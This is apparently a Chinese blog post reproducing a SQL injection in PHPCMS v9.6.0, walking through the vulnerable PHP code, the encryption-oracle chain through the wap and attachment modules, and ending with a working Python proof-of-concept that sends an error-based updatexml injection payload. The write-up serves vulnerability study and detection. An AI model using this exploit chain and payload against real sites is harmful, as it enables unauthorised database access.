categories:
- cve复现
tags:
- cve复现
title: phpcmsv9.6.0SQL注入
---
# phpcmsv9.6.0SQL注入

## 利用条件

1. 开启wap
2. phpcms 版本小于等于9.6.0



## 漏洞复现

漏洞信息:

> 这个版本的 **SQL注入** 主要在于程序对解密后的数据没有进行过滤. 漏洞文件: **phpcms/modules/content/down.php** 。在其 **init** 方法中，从 **GET** 数据中获取了 **a_k** 的值 ,解密后直接变量覆盖,导致命令执行

```php
public function init() {
		$a_k = trim($_GET['a_k']);
		$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key'));
		if(empty($a_k)) showmessage(L('illegal_parameters'));
		parse_str($a_k);
		if(isset($i)) $i = $id = intval($i);
		if(!isset($m)) showmessage(L('illegal_parameters'));
		if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters'));
		if(empty($f)) showmessage(L('url_invalid'));
		$allow_visitor = 1;
		$MODEL = getcache('model','commons');
		$tablename = $this->db->table_name = $this->db->db_tablepre.$MODEL[$modelid]['tablename'];
		$this->db->table_name = $tablename.'_data';
		$rs = $this->db->get_one(array('id'=>$id));	
		...
	}
```

`$this->db->get_one(array('id'=>$id));	`跟进去

```php
final public function get_one($where = '', $data = '*', $order = '', $group = '') {
		if (is_array($where)) $where = $this->sqls($where);
		return $this->db->get_one($data, $this->table_name, $where, $order, $group);
	}
```



```php
final public function sqls($where, $font = ' AND ') {
		if (is_array($where)) {
			$sql = '';
			foreach ($where as $key=>$val) {
				$sql .= $sql ? " $font `$key` = '$val' " : " `$key` = '$val'";
			}
			return $sql;
		} else {
			return $where;
		}
	}
```



```php
public function get_one($data, $table, $where = '', $order = '', $group = '') {
		$where = $where == '' ? '' : ' WHERE '.$where;
		$order = $order == '' ? '' : ' ORDER BY '.$order;
		$group = $group == '' ? '' : ' GROUP BY '.$group;
		$limit = ' LIMIT 1';
		$field = explode( ',', $data);
		array_walk($field, array($this, 'add_special_char'));
		$data = implode(',', $field);

		$sql = 'SELECT '.$data.' FROM `'.$this->config['database'].'`.`'.$table.'`'.$where.$group.$order.$limit;
		$this->execute($sql);
		$res = $this->fetch_next();
		$this->free_result();
		return $res;
	}
```



没有对解密后的id进行任何过滤

接着要找一个能用相同密钥加密的地方,这样便无需暴露auth_key就能执行恶意sql语句

我们利用` set_cookie`来生成加密数据

`setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);`

查找调用`set_cookie`且值`$value`可控的位置



`phpcms/modules/attachment/attachments.php` 文件的 `swfupload_json` 方法有满足我们需要的代码。(菜鸡直接看别人找到的)

```php
public function swfupload_json() {
		$arr['aid'] = intval($_GET['aid']);
		$arr['src'] = safe_replace(trim($_GET['src']));
		$arr['filename'] = urlencode(safe_replace($_GET['filename']));
		$json_str = json_encode($arr);
		$att_arr_exist = param::get_cookie('att_json');
		$att_arr_exist_tmp = explode('||', $att_arr_exist);
		if(is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) {
			return true;
		} else {
			$json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str;
			param::set_cookie('att_json',$json_str);
			return true;			
		}
	}
```

`$arr['src'] = safe_replace(trim($_GET['src']));`,跟进`safe_replace`

```php
function safe_replace($string) {
	$string = str_replace('%20','',$string);
	$string = str_replace('%27','',$string);
	$string = str_replace('%2527','',$string);
	$string = str_replace('*','',$string);
	$string = str_replace('"','&quot;',$string);
	$string = str_replace("'",'',$string);
	$string = str_replace('"','',$string);
	$string = str_replace(';','',$string);
	$string = str_replace('<','&lt;',$string);
	$string = str_replace('>','&gt;',$string);
	$string = str_replace("{",'',$string);
	$string = str_replace('}','',$string);
	$string = str_replace('\\','',$string);
	return $string;
}
```

虽然这里单引号被过滤了,但是前面是用`parse_str($a_k);`来恢复变量的,我们可以利用`safe_replace`能将某些字符替换为空格用url编码来绕过黑名单

但是在调用`swfupload_json` 前,它还会调用`__construct`方法

```php
function __construct() {
		pc_base::load_app_func('global');
		$this->upload_url = pc_base::load_config('system','upload_url');
		$this->upload_path = pc_base::load_config('system','upload_path');		
		$this->imgext = array('jpg','gif','png','bmp','jpeg');
		$this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'],'DECODE'));
		$this->isadmin = $this->admin_username = $_SESSION['roleid'] ? 1 : 0;
		$this->groupid = param::get_cookie('_groupid') ? param::get_cookie('_groupid') : 8;
		//判断是否登录
		if(empty($this->userid)){
			showmessage(L('please_login','','member'));
		}
	}
```

我们需要用`sys_auth($_POST['userid_flash'],'DECODE')`来生成`$this->userid`,来绕过死亡exit

这次我们还需要找一个地方来生成`userid`,但是限制更少了,只要`$this->userid`不为空即可

 我们可以搜到 `phpcms/modules/wap/index.php` 文件，在该文件中 `$_GET['siteid']` 可控，并且可以通过 **cookie** 获得加密后的数据,虽然有intval来过滤

```php
function __construct() {		
		$this->db = pc_base::load_model('content_model');
		$this->siteid = isset($_GET['siteid']) && (intval($_GET['siteid']) > 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1);
		param::set_cookie('siteid',$this->siteid);	
		$this->wap_site = getcache('wap_site','wap');
		$this->types = getcache('wap_type','wap');
		$this->wap = $this->wap_site[$this->siteid];
		define('WAP_SITEURL', $this->wap['domain'] ? $this->wap['domain'].'index.php?' : APP_PATH.'index.php?m=wap&siteid='.$this->siteid);
		if($this->wap['status']!=1) exit(L('wap_close_status'));
	}
```

于是整个攻击链便完整了

先利用wap来获得`userid`

` http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&siteid=1 `

`2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou`

再利用attachment来获得加密的恶意sql语句

```
http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&c=attachments&a=swfupload_json&src=(看poc吧)
post:
userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou
```



## 检测脚本

```python
import re
import requests
import random

def poc(url,proxies={}):
    sess=requests.session()
    sess.get("%s/index.php?m=wap&siteid=1"%url)
    sess.proxies=proxies
    pre=list(sess.cookies.get_dict())[0][:5]+"_"
    userid=sess.cookies.get_dict()[pre+"siteid"]
    param={
        "m":"attachment",
        "c":"attachments",
        "a":"swfupload_json",
        "src":"=1&id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&m=1&modelid=1&catid=1&f=1&ss"
    }
    sess.post("%s/index.php"%url,params=param,data={"userid_flash":userid})
    a_k=sess.cookies.get_dict()[pre+"att_json"]
    result=sess.get("%s/index.php?m=content&c=down&a=init&a_k=%s"%(url,a_k)).text
    #print(userid,a_k)
    if "XPATH syntax error" in result:
        return True
    return False
    

#,{"http":"socks5://127.0.0.1:1080"}
print(poc("http://127.0.0.1/cms/phpcms/9.6.0/"))
```





## 参考

 [https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集](https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集)

 